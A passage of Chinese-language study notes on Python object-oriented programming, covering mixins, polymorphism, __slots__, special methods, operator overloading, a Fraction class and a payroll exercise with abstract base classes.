class="built_in">set</span>(key,value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>(repMixin,get_set_Mixin):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">me = person(<span class="string">&quot;xyq&quot;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="built_in">print</span>(me)</span><br><span class="line"><span class="built_in">print</span>(me[<span class="string">&#x27;name&#x27;</span>],me[<span class="string">&#x27;age&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887273.png"></p>
<p>如上例子，<code>person子类</code>继承了两个<strong>混合类</strong>，从而在输出时实现了多种功能。</p>
<blockquote>
<p>关于混合类的一个提醒：</p>
</blockquote>
<ol>
<li>Mixin混合类<strong>自身不能实例化</strong>，仅可用于被子类继承。</li>
<li>Mixin实现的功能是通用的，单一的，<strong>按需继承</strong>。</li>
<li>Mixin只能用于<strong>扩展子类</strong>，不能影响<strong>子类的主要功能</strong>。如果对主要功能造成影响，就是基类了，不要使用Mixin命名。</li>
</ol>
<h2 id="7-3-3-多态"><a href="#7-3-3-多态" class="headerlink" title="7.3.3 多态"></a>7.3.3 多态</h2><blockquote>
<p>概念引入：</p>
</blockquote>
<p><strong>何为多态</strong>？我们前面介绍了方法的重写，即在子类中对父类的方法进行重新编写，使得<strong>不同的子类对象表现出不同的行为</strong>，这就是多态。</p>
<p><strong>看一个例子</strong>:<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887275.png"></p>
<p>上例就是<strong>多态</strong>的一个体现。<br>同时，对于不同对象的数据类型，我们可通过上例得到答案：<strong>子类的数据类型与父类相同</strong>，但是<strong>父类对应的对象的数据类型与其子类对应的对象的数据类型不同</strong>。</p>
<blockquote>
<p>开闭原则</p>
</blockquote>
<ul>
<li>开：对<strong>扩展开放</strong>，即允许新增ball的子类</li>
<li>闭：对<strong>修改封闭</strong>，即不需要对ball类做修改就可实现不同的形式。</li>
</ul>
<h1 id="7-4-动态属性和slots"><a href="#7-4-动态属性和slots" class="headerlink" title="7.4 动态属性和slots"></a>7.4 动态属性和slots</h1><p><strong>一个例子</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887276.png"></p>
<p><code>__slots__</code>是一个<strong>特殊的变量</strong>，可以看作<strong>一个卡槽</strong>，只有在这个卡槽里的属性才可以<strong>进行添加</strong>。</p>
<p><strong>Tips</strong>:slots只是限制了实例属性，对<strong>类属性</strong>不进行限制。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887277.png"></p>
<h1 id="7-5-定制类"><a href="#7-5-定制类" class="headerlink" title="7.5 定制类"></a>7.5 定制类</h1><blockquote>
<p>老规矩，先上思维导图</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887281.png"></p>
<h2 id="7-5-1-python中的特殊方法"><a href="#7-5-1-python中的特殊方法" class="headerlink" title="7.5.1 python中的特殊方法"></a>7.5.1 python中的特殊方法</h2><p>在python里，有些方法<strong>前后都添加了下划线</strong>，这些方法就是<strong>特殊方法</strong>。我们可以对特殊方法进行重写，扩展类的功能。</p>
<p>下面我们就介绍一些常用的特殊方法：</p>
<blockquote>
<p>1、<code>__str__方法和__repr__方法</code></p>
</blockquote>
<p>使得输出的格式更加好看。</p>
<p>先来<strong>介绍一些上面的两个方法</strong>:</p>
<ul>
<li><code>__str__方法</code>：当我们使用<code>print(对象1)</code>时调用的就是这个方法。输出用户看到的字符串。</li>
<li><code>__repr__方法</code>：当我们直接使用<code>对象1</code>时，调用的是这个方法。输出程序开发人员看到的字符串。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887278.png"></p>
<hr>
<p>所以我们可以<strong>对上方法进行重写</strong>，输出想要的格式。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887306.png"></p>
<p>也可以使用<code>__repr__ = __str__</code>简化</p>
<blockquote>
<p>2、<code>__getattr__</code>方法</p>
</blockquote>
<p>这个方法的作用就是获取某一个属性的值。也就是<code>对象.属性</code></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887307.png"></p>
<p>与这个<strong>方法类似</strong>的还有：</p>
<ul>
<li><code>__hasattr__</code>：<strong>判断</strong>是否有某属性</li>
<li><code>__setattr__</code>：<strong>修改</strong>一个属性</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887336.png"></p>
<p>所以我们可以重写这个方法<strong>把报错去掉</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887337.png"></p>
<p>最后输出的<strong>None</strong>是因为此方法有<strong>默认的返回值</strong>。</p>
<blockquote>
<p>3、<code>__call__方法</code></p>
</blockquote>
<p>这个方法的作用是将一个对象<strong>变为可调用对象</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887338.png"></p>
<blockquote>
<p>4、迭代器对象</p>
</blockquote>
<p>所谓的迭代器，就是满足<code>__iter__方法</code>和<code>__next__方法</code>的对象。所以我们要将一个对象变成迭代器，就要重写这两个方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">fib</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,num</span>):</span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line">        self.y = <span class="number">1</span></span><br><span class="line">        self.num = num</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration()</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            self.x,self.y = self.y,self.x+self.y</span><br><span class="line">            self.num -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> self.x</span><br><span class="line"></span><br><span class="line">f = fib(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887340.png"></p>
<p>重写这两个方法后就对象就<strong>变成了迭代器</strong>，使用next的输出方法。</p>
<blockquote>
<p>5、其他特殊方法</p>
</blockquote>
<p>见链接：<a href="https://docs.python.org/zh-cn/3.8/reference/datamodel.html#special-method-names">https://docs.python.org/zh-cn/3.8/reference/datamodel.html#special-method-names</a></p>
<h2 id="7-5-2-重载运算符"><a href="#7-5-2-重载运算符" class="headerlink" title="7.5.2 重载运算符"></a>7.5.2 重载运算符</h2><p>运算符的本质就是第一个操作数所在的命名空间的特殊方法。例如：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887341.png"></p>
<p>加法运算符就是上图所示的一个方法。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887343.png"></p>
<p>上例就是在<code>int()</code>这个<strong>命名空间</strong>里调用了<code>__add__方法</code>。</p>
<h1 id="7-6-综合实例：有理数类的实现"><a href="#7-6-综合实例：有理数类的实现" class="headerlink" title="7.6 综合实例：有理数类的实现"></a>7.6 综合实例：有理数类的实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, high=<span class="number">0</span>, down=<span class="number">1</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        一个初始化函数。我们需要实现有理数的判别与化简。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> down == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ZeroDivisionError(<span class="string">&quot;down cannot be 0!&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> high == <span class="number">0</span>:</span><br><span class="line">            self._high = <span class="number">0</span></span><br><span class="line">            self._down = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> (high &gt; <span class="number">0</span> <span class="keyword">and</span> down &lt; <span class="number">0</span>) <span class="keyword">or</span> (high &lt; <span class="number">0</span> <span class="keyword">and</span> down &gt; <span class="number">0</span>):</span><br><span class="line">                flag = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">            a = <span class="built_in">abs</span>(high)</span><br><span class="line">            b = <span class="built_in">abs</span>(down)</span><br><span class="line">            <span class="keyword">while</span> a % b != <span class="number">0</span>:</span><br><span class="line">                ta = a</span><br><span class="line">                tb = b</span><br><span class="line">                a = tb</span><br><span class="line">                b = ta % tb</span><br><span class="line">            self._high = <span class="built_in">abs</span>(high) // b * flag</span><br><span class="line">            self._down = <span class="built_in">abs</span>(down) // b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        high1 = (self._high * other._down) + (self._down * other._high)</span><br><span class="line">        down1 = self._down * other._down</span><br><span class="line">        <span class="keyword">return</span> Fraction(high1, down1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__sub__</span>(<span class="params">self, other</span>):</span><br><span class="line">        high1 = (self._high * other._down) - (self._down * other._high)</span><br><span class="line">        down1 = self._down * other._down</span><br><span class="line">        <span class="keyword">return</span> Fraction(high1, down1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> (self._high == other._high <span class="keyword">and</span> self._down == other._down)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> (self._high * other._down &lt; self._down * other._high)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">str</span>(self._high) + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">str</span>(self._down))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">frac1 = Fraction(a, b)</span><br><span class="line"><span class="built_in">print</span>(frac1)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">d = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">frac2 = Fraction(c, d)</span><br><span class="line"><span class="built_in">print</span>(frac1 &lt; frac2)</span><br><span class="line"><span class="built_in">print</span>(frac1 == frac2)</span><br><span class="line"></span><br><span class="line">res_add = frac1 + frac2</span><br><span class="line">res_sub = frac1 - frac2</span><br><span class="line"><span class="built_in">print</span>(res_add)</span><br><span class="line"><span class="built_in">print</span>(res_sub)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注意点</strong>：<br>1、对于分子分母的<strong>化简</strong>要理清原理。<br>2、对于加减比较等<strong>运算需要在类里进行定义</strong>。（具体的原理在上小节）</p>
<h1 id="7-7-练习补充"><a href="#7-7-练习补充" class="headerlink" title="7.7 练习补充"></a>7.7 练习补充</h1><blockquote>
<p>内容来自实训和测试</p>
</blockquote>
<h2 id="测试部分"><a href="#测试部分" class="headerlink" title="测试部分"></a>测试部分</h2><p>1、<code>__init__方法</code></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887342.png"></p>
<p>2、多态辨析</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887344.png"></p>
<p>3、静态方法<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887345.png"></p>
<p>4、类方法</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887346.png"></p>
<hr>
<p>5、析构函数的调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Register</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):  </span><br><span class="line">        self._age = kwargs.get(<span class="string">&#x27;age&#x27;</span>)  </span><br><span class="line">        self._name = kwargs.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">        self._sex = kwargs.get(<span class="string">&#x27;sex&#x27;</span>)  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_age_value</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">return</span> self._age  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name_value</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">return</span> self._name  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_sex_value</span>(<span class="params">se1f</span>) :  </span><br><span class="line">        <span class="keyword">return</span> self._sex  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;调用了一次析构函数&#x27;</span>)  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    wang = Register(age = <span class="number">8</span>, name=<span class="string">&#x27;wang&#x27;</span>, sex=<span class="string">&#x27;male&#x27;</span>)  </span><br><span class="line">    WANG = wang  </span><br><span class="line">    <span class="keyword">del</span> wang  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()  </span><br></pre></td></tr></table></figure>
<p>只是调用一个析构函数。</p>
<hr>
<p>6、Mixin混合类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReprMixin</span>:   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;[%s, %s, %s]&#x27;</span> %(self.name, self.gender, self.age)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MappingMixin</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):  </span><br><span class="line">        <span class="keyword">return</span> self.__dict__.get(key)  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key, value</span>):  </span><br><span class="line">        <span class="keyword">return</span> self.__dict__.<span class="built_in">set</span>(key, value)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>(<span class="title class_ inherited__">ReprMixin</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, gender, age, **kwargs</span>):  </span><br><span class="line">        self.name = name  </span><br><span class="line">        self.gender = gender  </span><br><span class="line">        self.age = age  </span><br><span class="line">        self.zhicheng = kwargs.get(<span class="string">&#x27;zhicheng&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">MappingMixin</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, gender, age, **kwargs</span>):  </span><br><span class="line">        self.name = name  </span><br><span class="line">        self.gender = gender  </span><br><span class="line">        self.age = age  </span><br><span class="line">        self.num = kwargs.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">t = Teacher(<span class="string">&#x27;教师甲&#x27;</span>, <span class="string">&#x27;female&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, zhicheng = <span class="string">&#x27;副教授&#x27;</span>)  </span><br><span class="line">s = Student(<span class="string">&#x27;学生甲&#x27;</span>, <span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;18&#x27;</span>, num =<span class="number">20180019</span>)  </span><br><span class="line"><span class="built_in">print</span>(t, s)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887347.png" alt="enter description here"></p>
<p><strong>原因</strong>：<br>t对象的类与s对象的类继承的类不同。t可以按照上重写的方式输出，而s可以使用字典的输出方法。</p>
<h2 id="实训项目"><a href="#实训项目" class="headerlink" title="实训项目"></a>实训项目</h2><blockquote>
<p>1、工资问题</p>
</blockquote>
<p><code>from abc import ABCMeta, abstractmethod</code></p>
<p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c08/p12_define_interface_or_abstract_base_class.html">上模块介绍见此</a></p>
<p><strong>代码1</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">某公司有三种类型的员工 分别是部门经理、程序员和销售员</span></span><br><span class="line"><span class="string">需要设计一个工资结算系统 根据提供的员工信息来计算月薪</span></span><br><span class="line"><span class="string">部门经理的月薪是每月固定15000元</span></span><br><span class="line"><span class="string">程序员的月薪按本月工作时间计算 每小时150元</span></span><br><span class="line"><span class="string">销售员的月薪是1200元的底薪加上销售额5%的提成</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>(<span class="built_in">object</span>, metaclass=ABCMeta):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;员工&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param name: 姓名</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        self._name = name</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回姓名&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_salary</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获得月薪</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :return: 月薪</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span>(<span class="title class_ inherited__">Employee</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;部门经理&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_salary</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">15000.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Programmer</span>(<span class="title class_ inherited__">Employee</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;程序员&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, working_hour=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">              初始化方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              :param name: 姓名</span></span><br><span class="line"><span class="string">              :param working_hour：工作时长</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name)</span><br><span class="line">        self._working_hour = working_hour</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">working_hour</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回工作时长&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        <span class="keyword">return</span> self._working_hour</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @working_hour.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">working_hour</span>(<span class="params">self, working_hour</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        设置工作时长</span></span><br><span class="line"><span class="string">        :param working_hour:工作时长</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        self._working_hour = working_hour <span class="keyword">if</span> working_hour &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_salary</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回程序员所得工资&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">150.0</span>*self._working_hour</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Salesman</span>(<span class="title class_ inherited__">Employee</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;销售员&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, sales=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                   初始化方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                   :param name: 姓名</span></span><br><span class="line"><span class="string">                   :param sales：销售额</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                   &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name)</span><br><span class="line">        self._sales = sales</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sales</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回销售额&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        <span class="keyword">return</span> self._sales</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @sales.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sales</span>(<span class="params">self, sales</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        设置销售额</span></span><br><span class="line"><span class="string">        :param sales:销售额</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        self._sales = sales <span class="keyword">if</span> sales&gt;<span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_salary</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回销售员所得工资&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">        <span class="comment"># *************begin************#</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1200</span>+<span class="number">0.05</span>*self._sales</span><br><span class="line">        <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>代码2</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> main <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    emps = [</span><br><span class="line">        Manager(<span class="string">&#x27;刘备&#x27;</span>), Programmer(<span class="string">&#x27;诸葛亮&#x27;</span>),</span><br><span class="line">        Manager(<span class="string">&#x27;曹操&#x27;</span>), Salesman(<span class="string">&#x27;荀彧&#x27;</span>),</span><br><span class="line">        Salesman(<span class="string">&#x27;吕布&#x27;</span>), Programmer(<span class="string">&#x27;张辽&#x27;</span>),</span><br><span class="line">        Programmer(<span class="string">&#x27;赵云&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> emp <span class="keyword">in</span> emps:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(emp, Programmer):</span><br><span class="line">            emp.working_hour = <span class="number">7</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(emp, Salesman):</span><br><span class="line">            emp.sales = <span class="number">100</span></span><br><span class="line">        <span class="comment"># 同样是接收get_salary这个消息但是不同的员工表现出了不同的行为(多态)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s本月工资为: ￥%s元&#x27;</span> %</span><br><span class="line">              (emp.name, emp.get_salary()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887362.png"></p>
<p><strong>注意点：</strong><br>1、<strong>抽象基类</strong>的使用<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649562238890.png"><br>将员工类定义为抽象基类，此基类无法被实例化，但是可以被继承。同时使用装饰器规定了抽象方法， 其作用是继承此基类的子类必须去实现这个方法，否则会报错。<br>通过<code>from abc import ABCMeta, abstractmethod</code>导入模块。</p>
<blockquote>
<p>2、设计LFU缓存类</p>
</blockquote>
